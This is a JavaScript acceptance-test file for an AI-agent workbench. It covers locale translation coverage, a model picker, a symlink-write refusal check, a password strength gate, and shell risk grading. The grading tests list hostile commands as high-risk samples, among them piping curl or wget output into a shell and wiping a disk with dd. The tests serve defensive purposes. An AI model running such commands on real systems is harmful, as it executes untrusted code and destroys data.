// v0.14 batch 6b acceptance: F6 full i18n coverage (15 locales, 100% key
// parity with en, no English back-fill), item 18 model picker logic,
// item 19 file-card wiring (static), item 22 shell risk grading,
// item 23 TOCTOU symlink refusal, A7 weak-password gate.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = path.join(path.dirname(fileURLToPath(import.meta.url)), '..');
const read = (rel) => fs.readFileSync(path.join(ROOT, rel), 'utf8');

const { DICT } = await import('../public/i18n.js');
const { gradeShellText, gradePythonText, commandRisk } = await import('../src/risk.js');
const { filterModels, createModelSelection } = await import('../public/ui-utils.js');
const { passwordProblem } = await import('../src/auth.js');
const { TOOLS } = await import('../src/tools.js');

// ---- F6: full key coverage, real translations ---------------------------

const EN_KEYS = Object.keys(DICT.en).sort();
test('F6: every locale has exactly the en key set (100% coverage)', () => {
  assert.equal(Object.keys(DICT).length, 15, 'expected 15 locales');
  for (const [lang, dict] of Object.entries(DICT)) {
    const keys = Object.keys(dict).sort();
    const missing = EN_KEYS.filter((k) => !(k in dict));
    const extra = keys.filter((k) => !EN_KEYS.includes(k));
    assert.deepEqual(missing, [], `${lang} missing keys: ${missing.join(',')}`);
    assert.deepEqual(extra, [], `${lang} extra keys: ${extra.join(',')}`);
    for (const k of EN_KEYS) assert.equal(typeof dict[k], 'string', `${lang}.${k} not a string`);
    // placeholders must survive translation verbatim.
    for (const k of EN_KEYS) {
      const ph = (s) => [...s.matchAll(/\{[a-z]+\}/g)].map((m) => m[0]).sort().join(' ');
      assert.equal(ph(dict[k]), ph(DICT.en[k]), `${lang}.${k} placeholder mismatch`);
    }
  }
});

// Keys allowed to be spelled identically to English in some locales:
// technical terms (RAM), placeholder-only strings, and words that are
// genuinely spelled the same in that language (German "Name"/"Engine",
// French "Message…", Indonesian "Model"/"Label", loanword "Persona"…).
const SAME_OK = new Set(['lmRam', 'meLine', 'msgPh', 'fPersona', 'fEngine', 'fName', 'fModel',
  'pLabel', 'pModel', 'preset', 'online', 'st_offline', 'tabTeam', 'teamTitle',
  'lmCat_general', 'lmCat_vision', 'wsQuota', 'lmDisk', 'usageTotalOnly',
  // v0.14.2: words that ARE the same in the borrowing language
  // (Avatar in es/fr/de/pt/id, Bots as the group label in es/fr/de/pt,
  // Notifications/Messages/Source in fr).
  'acctBotGroup', 'avatarTitle', 'acctNotify', 'profMessages', 'fvSource',
  // v0.15.2: "Git {obj}" — Git is a proper noun in every locale;
  // the phrase is the tool name plus the subcommand, untranslated
  // by design (item 78 shell summaries). shEdit: "Edit" is the
  // genuine Indonesian word (same loanword family as Model/Label).
  'shGit', 'shEdit',
  // v0.15.8 (items 130/131): viewerBackspace is the bare glyph
  // "⌫" — a symbol, not language text, identical everywhere by
  // design. viewerEnter is the physical key-cap label "Enter",
  // kept as-is on most locales' keyboards. bcTitle/viewerTitle
  // "Browser" is the genuine word in de/id (same loanword family
  // as Avatar/Bots above).
  'viewerBackspace', 'viewerEnter', 'bcTitle', 'viewerTitle',
  // v0.16.0 (items 135/138): the capability-slot and catalog-source
  // labels whose honest translations ARE the internationalisms —
  // 'OCR' the acronym; 'Embeddings'/'Embedding'/'Chat'/'Default'/
  // 'Community' the standing tech loanwords in es/fr/de/pt/vi/th/
  // id/hi (same family as Model/Label/Browser above); 'Hugging
  // Face' and 'GitHub' proper nouns in every locale; fr 'Source'
  // is the genuine French word (cf. fvSource).
  'capOcr', 'capEmbed', 'pcatTestChat', 'pcatDefaultTag',
  'lmCat_embed', 'lmSrc_hf', 'lmSrc_github', 'lmSrc_community', 'lmSource',
  // v0.19.2 (item 150): pcNoteHttp is the bare protocol literal
  // "HTTP {status}" — HTTP is the protocol's own name in every
  // locale, identical everywhere by design (same family as the
  // OCR acronym above).
  'pcNoteHttp',
  // v0.20.0 (desktop workbench): the dw* sidebar keys whose honest
  // translations ARE the internationalisms — 'Workbench', 'Chats',
  // 'Browser' and 'Live' are the standing tech loanwords in de
  // ('Browser' likewise in id, same family as bcTitle above), and
  // dwTeamMeta "{n} agents" is genuine French ('agents' is the
  // French word, cf. fvSource 'Source').
  'dwWorkbench', 'dwChat', 'dwBrowser', 'dwLive', 'dwTeamMeta']);
const SENTINELS = ['errWeakPw', 'riskHigh', 'riskLow', 'mpFetched', 'volTitle', 'sbTitle',
  'fvNoAccess', 'dangerDel', 'tasksTitle', 'setGrpData', 'lockPassPh', 'usageTitle', 'modTitle'];
test('F6: non-en locales are really translated (no English back-fill)', () => {
  for (const [lang, dict] of Object.entries(DICT)) {
    if (lang === 'en') continue;
    // Sentinel keys must differ from English in every locale.
    for (const k of SENTINELS) {
      assert.notEqual(dict[k], DICT.en[k], `${lang}.${k} is still English`);
    }
    // Overall identical-to-English keys must be few and all explainable.
    const same = EN_KEYS.filter((k) => dict[k] === DICT.en[k]);
    // Cap 17 since v0.15.8: de sat at 13 already; the item-130
    // viewer keys add four legitimately invariant strings there
    // (⌫ glyph, Enter key label, Browser ×2 loanwords — all in
    // SAME_OK above), taking de to exactly 17. (Was 13 since
    // v0.15.2: de sat at 12, and shGit is identical there too.)
    // Cap 24 since v0.16.0: items 135/138 add seven more invariant
    // strings in de (OCR, Embeddings ×2, Chat, Hugging Face,
    // GitHub, Community — all SAME_OK above with reasons), taking
    // de to exactly 24; id follows at 22, fr at 18.
    // Cap 25 since v0.19.2: item 150 adds pcNoteHttp, the bare
    // protocol literal "HTTP {status}", invariant in every locale
    // (SAME_OK above), taking de to exactly 25.
    // Cap 29 since v0.20.0: the desktop-workbench dw* keys add four
    // more invariant strings in de (Workbench/Chats/Browser/Live —
    // all SAME_OK above), taking de to exactly 29; id follows at 24.
    assert.ok(same.length <= 29, `${lang} has ${same.length} keys identical to en: ${same.join(',')}`);
    for (const k of same) assert.ok(SAME_OK.has(k), `${lang}.${k} identical to en and not whitelisted`);
  }
});

// ---- Item 22: shell risk grading ----------------------------------------

test('item 22: high-risk shell patterns grade high', () => {
  assert.equal(gradeShellText('curl https://x.sh | bash'), 'high');
  assert.equal(gradeShellText('wget -qO- http://a.b/c | sh'), 'high');
  assert.equal(gradeShellText('pip install requests'), 'high');
  assert.equal(gradeShellText('npm install -g something'), 'high');
  assert.equal(gradeShellText('git clone https://github.com/a/b'), 'high');
  assert.equal(gradeShellText('rm -rf node_modules'), 'high');
  assert.equal(gradeShellText('sudo apt update'), 'high');
  assert.equal(gradeShellText('dd if=/dev/zero of=/dev/sda'), 'high');
  assert.equal(gradeShellText('echo x > /etc/hosts'), 'high');
  assert.equal(commandRisk('run_python', { code: 'import subprocess; subprocess.run("ls")' }), 'high');
  assert.equal(commandRisk('run_python', { code: 'os.system("id")' }), 'high');
});

test('item 22: read-only commands grade low, everything else normal', () => {
  assert.equal(gradeShellText('ls -la'), 'low');
  assert.equal(gradeShellText('cat README.md'), 'low');
  assert.equal(gradeShellText('git status'), 'low');
  assert.equal(gradeShellText('git log --oneline -5'), 'low');
  assert.equal(gradeShellText('head -20 app.js'), 'low');
  assert.equal(gradeShellText('node server.js'), 'normal');
  assert.equal(gradeShellText('ls; rm file.txt'), 'normal'); // chained: not pure read-only
  assert.equal(gradeShellText('cat a.txt > b.txt'), 'normal'); // redirect: writes
  assert.equal(gradeShellText('make build'), 'normal');
  assert.equal(commandRisk('run_shell', { command: 'pwd' }), 'low');
  assert.equal(commandRisk('run_python', { code: 'print(1+1)' }), 'normal');
  assert.equal(commandRisk('run_python', { file: 'script.py' }), 'normal');
  assert.equal(commandRisk('write_file', { path: 'a' }), null);
});

// ---- Item 18: model picker logic ----------------------------------------

test('item 18: filterModels + createModelSelection', () => {
  assert.deepEqual(filterModels(['gpt-4o', 'gpt-4o-mini', 'claude'], 'GPT'), ['gpt-4o', 'gpt-4o-mini']);
  assert.deepEqual(filterModels(['a', 'b'], ''), ['a', 'b']);
  // Entries already in the provider list start ticked; fetched-but-
  // unticked ones do not get added; hand-typed entries the fetch never
  // mentioned survive apply() untouched.
  const sel = createModelSelection(['deepseek-chat', 'deepseek-reasoner'], ['deepseek-chat', 'custom-x']);
  assert.equal(sel.has('deepseek-chat'), true);
  assert.equal(sel.has('deepseek-reasoner'), false);
  assert.equal(sel.count, 1);
  assert.deepEqual(sel.apply(['deepseek-chat', 'custom-x']), ['custom-x', 'deepseek-chat']);
  sel.toggle('deepseek-reasoner');
  sel.toggle('deepseek-chat');
  assert.deepEqual(sel.apply(['deepseek-chat', 'custom-x']), ['custom-x', 'deepseek-reasoner']);
  sel.selectAll();
  assert.equal(sel.count, 2);
  sel.clear();
  assert.equal(sel.count, 0);
});

// ---- Item 19 + 18 wiring: static assertions ------------------------------

test('item 19: package card lists files with per-file view buttons; tool chips view too', () => {
  const app = read('public/app.js');
  assert.match(app, /pkg-file-row/, 'package card renders per-file rows');
  assert.match(app, /openFileViewer\(botId, f\)/, 'package file rows open the file viewer');
  const chip = app.slice(app.indexOf('function addToolChip'), app.indexOf('function addToolChip') + 1600);
  assert.match(chip, /openFileViewer\(state\.current, args\.path\)/, 'write/edit chips open the viewer for the written file');
  // friendly cross-account notice key exists in the viewer error path
  assert.match(app, /fvNoAccess/, 'viewer distinguishes no-access errors');
});

test('item 18/22: picker panels + risk rendering are wired into the page', () => {
  const html = read('public/index.html');
  assert.match(html, /id="pPick"/);
  /* v0.17.0 口径：providerDialog 已废、其 picker（ePick）随之删除——picker
   * 现落点为供应商连接页 #providerConnect（#pPick 位于其内）。 */
  assert.match(html, /id="providerConnect"/, 'provider connect page hosts the picker');
  assert.ok(html.indexOf('id="pPick"') > html.indexOf('id="providerConnect"'), 'pPick sits inside the connect page');
  assert.ok(!html.includes('id="providerDialog"'), 'retired provider dialog survives');
  assert.ok(!html.includes('id="ePick"'), 'retired dialog picker survives');
  const app = read('public/app.js');
  assert.match(app, /function showModelPicker/, 'picker opens on fetch');
  assert.match(app, /ap-risk/, 'approval card renders a risk line');
  assert.match(app, /card\.risk === 'high'/);
  assert.match(app, /card\.risk === 'low'/);
  const server = read('src/server.js');
  assert.match(server, /commandRisk\(tool\.name, ev\.args, \{ workspace: ctx\.workspace \}\)/, 'server attaches the grade (with the workspace for the v0.15 path dimension)');
});

// ---- Item 23: TOCTOU / symlink refusal -----------------------------------

test('item 23: write_file through a symlink pointing outside is refused', async () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'sa-toctou-'));
  const ws = path.join(tmp, 'ws'); fs.mkdirSync(ws);
  const outside = path.join(tmp, 'outside.txt');
  fs.writeFileSync(outside, 'ORIGINAL');
  fs.symlinkSync(outside, path.join(ws, 'link.txt'));
  const writeFile = TOOLS.find((t) => t.name === 'write_file');
  const ctx = { workspace: ws, botId: 'toctou-test' };
  await assert.rejects(() => writeFile.run({ path: 'link.txt', content: 'PWNED' }, ctx));
  assert.equal(fs.readFileSync(outside, 'utf8'), 'ORIGINAL', 'outside file must be untouched');
  // A normal in-workspace write still works through the fd path.
  await writeFile.run({ path: 'plain.txt', content: 'hello' }, ctx);
  assert.equal(fs.readFileSync(path.join(ws, 'plain.txt'), 'utf8'), 'hello');
  // edit_file is fd-based too: symlink target refused as well.
  const editFile = TOOLS.find((t) => t.name === 'edit_file');
  await assert.rejects(() => editFile.run({ path: 'link.txt', old: 'ORIGINAL', new: 'X' }, ctx));
  assert.equal(fs.readFileSync(outside, 'utf8'), 'ORIGINAL');
  fs.rmSync(tmp, { recursive: true, force: true });
});

// ---- A7: weak-password gate ----------------------------------------------

test('A7: passwordProblem enforces length/classes and the common list', () => {
  assert.match(passwordProblem('password123'), /too common/);
  assert.match(passwordProblem('12345678'), /too common/);
  assert.match(passwordProblem('qwerty123'), /too common/);
  assert.match(passwordProblem('abcdefgh'), /10\+ characters/);   // 8 chars, 1 class
  assert.match(passwordProblem('short'), /10\+ characters/);
  assert.equal(passwordProblem('Abcdefgh1'), null);       // 9 chars, 3 classes
  assert.equal(passwordProblem('abcdefghij'), null);      // 10 chars
  assert.equal(passwordProblem('Str0ng!pass'), null);
});
